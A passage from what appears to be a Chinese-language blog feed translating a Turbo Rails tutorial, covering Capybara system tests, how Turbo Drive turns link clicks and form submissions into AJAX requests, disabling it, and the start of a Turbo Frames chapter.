    fill_in <span class="token string-literal"><span class="token string">"Unit price"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token number">1234</span>
    click_on <span class="token string-literal"><span class="token string">"Create item"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>
    assert_text <span class="token string-literal"><span class="token string">"Animation"</span></span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token number">1234</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Updating a line item"</span></span> <span class="token keyword">do</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    within <span class="token string-literal"><span class="token string">"#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">dom_id<span class="token punctuation">(</span><span class="token variable">@line_item</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
      click_on <span class="token string-literal"><span class="token string">"Edit"</span></span>
    <span class="token keyword">end</span>
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Capybara article"</span></span>
    fill_in <span class="token string-literal"><span class="token string">"Unit price"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token number">1234</span>
    click_on <span class="token string-literal"><span class="token string">"Update item"</span></span>

    assert_text <span class="token string-literal"><span class="token string">"Capybara article"</span></span>
    assert_text number_to_currency<span class="token punctuation">(</span><span class="token number">1234</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Destroying a line item"</span></span> <span class="token keyword">do</span>
    within <span class="token string-literal"><span class="token string">"#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
      assert_text <span class="token variable">@line_item</span><span class="token punctuation">.</span>name
    <span class="token keyword">end</span>

    within <span class="token string-literal"><span class="token string">"#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">dom_id<span class="token punctuation">(</span><span class="token variable">@line_item</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
      click_on <span class="token string-literal"><span class="token string">"Delete"</span></span>
    <span class="token keyword">end</span>

    within <span class="token string-literal"><span class="token string">"#</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span> <span class="token keyword">do</span>
      assert_no_text <span class="token variable">@line_item</span><span class="token punctuation">.</span>name
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果执行<code>rails test:all</code>指令，我们会有之前两个测试需要修复，我们有多个相同名称的”Edit”和”Delete”链接，Capybara不知道点击哪个，所以提出了一个<code>Capybara::Ambiguous</code>异常。</p>
<p>为了修复这个问题，我们必须更具体地使用我们在within块中使用的id。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/line_item_dates_test.rb</span>

<span class="token comment"># All the previous code</span>

test <span class="token string-literal"><span class="token string">"Updating a line item date"</span></span> <span class="token keyword">do</span>
  assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

  within id<span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
    click_on <span class="token string-literal"><span class="token string">"Edit"</span></span>
  <span class="token keyword">end</span>

  assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"First quote"</span></span>

  fill_in <span class="token string-literal"><span class="token string">"Date"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day
  click_on <span class="token string-literal"><span class="token string">"Update date"</span></span>

  assert_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current <span class="token operator">+</span> <span class="token number">1.</span>day<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

test <span class="token string-literal"><span class="token string">"Destroying a line item date"</span></span> <span class="token keyword">do</span>
  assert_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>

  accept_confirm <span class="token keyword">do</span>
    within id<span class="token operator">:</span> dom_id<span class="token punctuation">(</span><span class="token variable">@line_item_date</span><span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">)</span> <span class="token keyword">do</span>
      click_on <span class="token string-literal"><span class="token string">"Delete"</span></span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  assert_no_text I18n<span class="token punctuation">.</span>l<span class="token punctuation">(</span>Date<span class="token punctuation">.</span>current<span class="token punctuation">,</span> <span class="token symbol">format</span><span class="token operator">:</span> <span class="token symbol">:long</span><span class="token punctuation">)</span>
<span class="token keyword">end</span>

<span class="token comment"># All the previous code</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再执行<code>bin/rails test:all</code>，就全部变绿了。</p>
<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>本章节中，我们完善了我们的quote编辑器，我们学习了如何去管理嵌套的Turbo Frames并且保证我们的代码可读性，通过Turbo Frames的命名约定</p>
<p>下一章中，我们把所有内容敲定。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第四章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E5%9B%9B%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h2 id="Turbo-Drive"><a href="#Turbo-Drive" class="headerlink" title="Turbo Drive"></a>Turbo Drive</h2><p>这一章我们将解释<code>Turbo Drive</code>是什么？它是怎么转化Link clicks和Form submissions为Ajax请求来加速Rails系统。</p>
<h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h3><p>Turbo Drive是Turbo的第一部分，已经被Rails7默认引入了，可以看一下Gemfile和application.js</p>
<pre class="line-numbers language-none"><code class="language-none"># Gemfile

# Hotwire&#39;s SPA-like page accelerator [https:&#x2F;&#x2F;turbo.hotwired.dev]
gem &quot;turbo-rails&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/application.js</span>

<span class="token comment">// Entry point for the build script in your package.json</span>
<span class="token keyword">import</span> <span class="token string">"@hotwired/turbo-rails"</span>
<span class="token keyword">import</span> <span class="token string">"./controllers"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过<code>Turbo Drive</code>，HTML页面不会被完全重新渲染，当我们的<code>Turbo Drive</code>拦截一个<code>link clikc or a form submission</code>时，这个Ajax请求的响应体只会替换HTML也页面中的<body>部分，其中大多数请求<head>部分不会修改，这就使性能得到优化，因为不需要重复下载相同的CSS和JS，当你第一次访问网页时，就下载了所有的<code>CSS和JS</code>文件，后面就不需要再加载了。</p>
<p>但隐藏的问题是：如果服务端CSS和JS代码更新了，但用户之前访问过网页，CSS和JS不再更新怎么办？我们将在后面回答这个问题、</p>
<h3 id="Turbo-Drive是如何工作的？"><a href="#Turbo-Drive是如何工作的？" class="headerlink" title="Turbo Drive是如何工作的？"></a>Turbo Drive是如何工作的？</h3><p>Turbo Drive拦截了 links 的单击事件和 forms 的提交事件。</p>
<p>每次一个 link is clicked ，Turbo Drive 就会拦截该事件，重写默认的行为转为Ajax请求，并把结果中的<body>部分与原页面做替换。</p>
<p>这也是为什么Rails7项目默认为单页面应用，页面第一次访问不会完全从新渲染,只有<body>部分。</p>
<p>每当有links被click时，伪代码实现例如：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Select all links on the page</span>
<span class="token keyword">const</span> links <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Add a "click" event listener on each link to intercept the click</span>
<span class="token comment">// and override the default behavior</span>
links<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">link</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  link<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Override default behavior</span>
    event<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">// Convert the click on the link into an AJAX request</span>
    <span class="token comment">// Replace the current page's &lt;body> with the &lt;body> of the response</span>
    <span class="token comment">// and leave the &lt;head> unchanged</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于表单提交也是类似的，不再展示伪代码。</p>
<hr>
<p>在前面我们讨论过，Rails7的一大变化。</p>
<p><strong>Invalid form submissions have to return a 422 status code for Turbo Drive to replace the <body> of the page and display the form errors.</strong></p>
<p>422状态码就是指：Rails中的<code>:unprocessable_entity</code>，如果你看<code>scaffold generator</code>生成的代码，就会发现在<code>#create and #update</code>默认带有<code>status: :unprocessable_entity</code>。</p>
<hr>
<p><strong>Turbolinks</strong>是<strong>Turbo Drive</strong>的前身，只是前者只能拦截 <code>clicks on links</code>,不包含表单提交，现在<strong>Turbo Drive</strong>包含处理表单提交，所以作者重命名TurboLinks为Turbo Drive。</p>
<hr>
<h3 id="禁用Turbo-Drive"><a href="#禁用Turbo-Drive" class="headerlink" title="禁用Turbo Drive"></a>禁用Turbo Drive</h3><p>在某些情况中，我们需要禁用Turbo Drive，比如某些Gem不支持Turbo Drive，一个好的应对方式就是在特定的地方禁用，例如登陆和退出的表单。下面我们示例禁用特定的<code>links and forms</code></p>
<p>只需要添加：<code>data-turbo=&quot;false&quot;</code></p>
<p>比如在<code>Quotes#index</code>页面，让我们禁用新建功能中的Turbo Drive</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    &lt;%= link_to "New quote",
                new_quote_path,
                class: "btn btn--primary",
                data: &#123; turbo: false &#125; %>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>

  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果你去看控制台中的网络包，你会发现每次请求时有四个请求。</p>
<ul>
<li>One HTML request to load the Quotes#new HTML page</li>
<li>One request to load the CSS bundle</li>
<li>One request to load the JavaScript bundle</li>
<li>One request to load the favicon of the page</li>
</ul>
<hr>
<p>这里是用谷歌浏览器，如果你是其他浏览器，可能不太一样</p>
<hr>
<p>但如果我们恢复刚才的代码，再次请求，就会发现只有两个请求：</p>
<ul>
<li>One AJAX request to get the HTML for the Quotes#new page</li>
<li>One request to load the favicon of the page</li>
</ul>
<p>同样的我们也可以测试表单提交：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%= simple_form_for quote,
                    html: &#123;
                      class: "quote form",
                      data: &#123; turbo: false &#125;
                    &#125; do |f| %>

  &lt;% if quote.errors.any? %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>error-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      &lt;%= quote.errors.full_messages.to_sentence.capitalize %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= f.input :name, input_html: &#123; autofocus: true &#125; %>
  &lt;%= f.submit class: "btn btn--secondary" %>
&lt;% end %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>请求时，发现有五个请求包：</p>
<ul>
<li>One HTML request to submit the form</li>
<li>The HTML redirection to the Quotes#index page</li>
<li>One request to load the CSS bundle</li>
<li>One request to load the JavaScript bundle</li>
<li>One request to load the favicon of the page</li>
</ul>
<p>当我们恢复时，再看只有三个请求包</p>
<ul>
<li>One AJAX request to submit the form</li>
<li>The AJAX redirection to the Quotes#index page</li>
<li>One request to load the favicon of the page</li>
</ul>
<p>我们已经证明了Turbo Drive为我们做什么了。</p>
<ul>
<li>它转化了所有的 Link clicks 和 form submissions 为AJAX请求，并加速应用</li>
<li>它阻拦了加载CSS和JS文件的重复加载</li>
</ul>
<p>我们发现，我们也没有写一句JS代码</p>
<hr>
<p>如果你想全局禁用Turbo Drive，虽然我们不推荐，你可以以下操作：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/application.js</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Turbo <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"@hotwired/turbo-rails"</span>
Turbo<span class="token punctuation">.</span>session<span class="token punctuation">.</span>drive <span class="token operator">=</span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Reloading-the-page-with-data-turbo-track-”reload”"><a href="#Reloading-the-page-with-data-turbo-track-”reload”" class="headerlink" title="Reloading the page with data-turbo-track=”reload”"></a>Reloading the page with data-turbo-track=”reload”</h3><p>之前我们说过，ajax请求仅仅替换<body>中的内容，而没有<head>，导致用户无法使用最新的JS和CSS文件。</p>
<p>为了解决这个问题，每次新的请求，Turbo Drive比较DOM节点中的<code>data-turbo-track=&quot;reload&quot;</code>和响应中的<head>，如果不同则重新加载整个页面。</p>
<p>如果你看一下<code>application.html.erb</code>，就会发现：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/layouts/application.html.erb %>

&lt;%= stylesheet_link_tag "application", "data-turbo-track": "reload" %>
&lt;%= javascript_include_tag "application", "data-turbo-track": "reload", defer: true %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们知道他的作用了。</p>
<p>这里你可以打开控制台去看一下请求，然后修改你的CSS或JS文件，再发一个请求，看一下和之前有什么区别？</p>
<hr>
<p><strong>注意：</strong>做一些小的测试体验，像上面那样，会让我们更清晰的明白发生了什么事儿，在下面的章节中我们还会做一些小的测试。</p>
<hr>
<h3 id="Changing-the-style-of-the-Turbo-Drive-progress-bar"><a href="#Changing-the-style-of-the-Turbo-Drive-progress-bar" class="headerlink" title="Changing the style of the Turbo Drive progress bar"></a>Changing the style of the Turbo Drive progress bar</h3><p>随着<code>Turbo Drive</code>重写浏览器的默认行为，浏览器的进度条会受到一些影响。</p>
<p><code>Turbo</code>已经为浏览器默认加载条构建了替代品，并且我们可以引入自己的样式，让我们先来写样式：</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_turbo_progress_bar.scss

.turbo-progress-bar</span> <span class="token punctuation">&#123;</span>
  <span class="token property">background</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right<span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--color-primary-rotate<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>别忘了引入Sass文件</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css">// app/assets/stylesheets/application.sass.scss

// All the previous code
<span class="token atrule"><span class="token rule">@import</span> <span class="token string">"components/turbo_progress_bar"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>想要查看到我们的样式是否成功的加载，一个好办法就是让我们程序休眠几秒，我们可以试试：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/application_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span>Base
  <span class="token comment"># Add this line to see the progress bar long enough</span>
  <span class="token comment"># and remove it when it has the expected styles</span>
  before_action <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">&#123;</span> sleep <span class="token number">3</span> <span class="token punctuation">&#125;</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在你就能更方便的看到效果了，让我们删除这段用于休眠的临时代码吧。</p>
<h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>可以看到这一章很简单，我们基本没写什么自定义JS代码，就能获得实质性的性能提升。</p>
<p>下一章，我们将使用<code>Turbo Freames</code>去转化一些复合页面为小的片段页面。</p>
<h2 id="Turbo-Frames-and-Turbo-Stream-templates"><a href="#Turbo-Frames-and-Turbo-Stream-templates" class="headerlink" title="Turbo Frames and Turbo Stream templates"></a>Turbo Frames and Turbo Stream templates</h2><p>这一章节，我们将学习如何切割页面为小的独立部分，读完这一章节后，增删改查行为就会统一在index页面展示。</p>
<h3 id="要干嘛？"><a href="#要干嘛？" class="headerlink" title="要干嘛？"></a>要干嘛？</h3><p>在我们现在的quotes编辑器中，当进行<code>#new and #edit</code>时，会跳转到其他的页面，而本章希望通过<code>Turbo Frames and Turbo Streams</code>做到当操作时，均在<code>Quotes#index</code>页面进行。可以看看线上的效果：<a href="https://www.hotrails.dev/quotes">https://www.hotrails.dev/quotes</a></p>
<p>在我们练习<code>Turbo Frame</code>技巧前，先画一些草图来说明我们要干的事儿，然后更新我们的系统测试。</p>
<p>现在我们的<code>Quotes#index</code>页面长这个样子</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/7cae681616507225567e0f2a00f99fcf.png" alt="img"></p>
<p>现在我们希望当点击<code>New quote</code>时，表单可以添加到原来页面的标题下面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/bb3112182f8b730e7f29af8b05abb35e.png" alt="img"></p>
<p>当我们点击<code>Create quote</code>按钮时，创建好的quote应该展示在quotes列表的最上面</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/48b3d9cc26ef1c1bf823fbb9557bfabf.png" alt="img"></p>
<p>当我们点击第二个quote的<code>Edit</code>按钮时，表格应该直接替换选择的这个quote卡片</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/650ce5d398557c92636e06bf9d59a602.png" alt="img"></p>
<p>当我们点击<code>Update quote</code>按钮时，又展示回卡片的样式，并且数据更新</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/68d75d31efc764d338d58bb2e3f96192.png" alt="img"></p>
<p>而其他的行为，应该不受到影响</p>
<ul>
<li>点击<code>Delete</code>按钮时，该条quote应该就被删除掉来了</li>
<li>点击quote的标题时，应该跳转到<code>Quotes#show</code>页面</li>
</ul>
<p>让我们现在更新测试代码来匹配对应的设想行为</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/quotes_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">QuotesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  setup <span class="token keyword">do</span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> quotes<span class="token punctuation">(</span><span class="token symbol">:first</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Showing a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    click_link <span class="token variable">@quote</span><span class="token punctuation">.</span>name

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>name
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Creating a new quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>

    click_on <span class="token string-literal"><span class="token string">"New quote"</span></span>
    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Capybara quote"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    click_on <span class="token string-literal"><span class="token string">"Create quote"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    assert_text <span class="token string-literal"><span class="token string">"Capybara quote"</span></span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Updating a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>

    click_on <span class="token string-literal"><span class="token string">"Edit"</span></span><span class="token punctuation">,</span> <span class="token symbol">match</span><span class="token operator">:</span> <span class="token symbol">:first</span>
    fill_in <span class="token string-literal"><span class="token string">"Name"</span></span><span class="token punctuation">,</span> <span class="token symbol">with</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Updated quote"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    click_on <span class="token string-literal"><span class="token string">"Update quote"</span></span>

    assert_selector <span class="token string-literal"><span class="token string">"h1"</span></span><span class="token punctuation">,</span> <span class="token symbol">text</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quotes"</span></span>
    assert_text <span class="token string-literal"><span class="token string">"Updated quote"</span></span>
  <span class="token keyword">end</span>

  test <span class="token string-literal"><span class="token string">"Destroying a quote"</span></span> <span class="token keyword">do</span>
    visit quotes_path
    assert_text <span class="token variable">@quote</span><span class="token punctuation">.</span>name

    click_on <span class="token string-literal"><span class="token string">"Delete"</span></span><span class="token punctuation">,</span> <span class="token symbol">match</span><span class="token operator">:</span> <span class="token symbol">:first</span>
    assert_no_text <span class="token variable">@quote</span><span class="token punctuation">.</span>name
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="什么是Turbo-Frames？"><a href="#什么是Turbo-Frames？" class="headerlink" title="什么是Turbo Frames？"></a>什么是Turbo Frames？</h3><pre class="line-numbers language-none"><code class="language-none">Turbo Frames are independent pieces of a web page that can be appended, prepended, replaced, or removed without a complete page refresh and writing a single line of JavaScript!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也就是可以添加，删除，替换独立的网页片段，而不需要刷新和写自定义的JS。</p>
<p>这一部分中，我们将使用几个小的案例来学习<code>Turbo Frames</code>，然后再实现我们上面的预想。</p>
<p>让我们创建第一个<code>Turbo Frame</code>，这里我们使用<code>turbo_frame_tag helper</code>，我们把<code>Quotes#index</code>页面中header部分嵌套到 id 为”first_turbo_frame”的Turbo Frame中</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  &lt;%= turbo_frame_tag "first_turbo_frame" do %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Quotes<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
      &lt;%= link_to "New quote", new_quote_path, class: "btn btn--primary" %>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  &lt;% end %>

  &lt;%= render @quotes %>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果你看一下DOM，Turbo Frame生成的HTML就长下面的样子</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-frame</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>first_turbo_frame<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
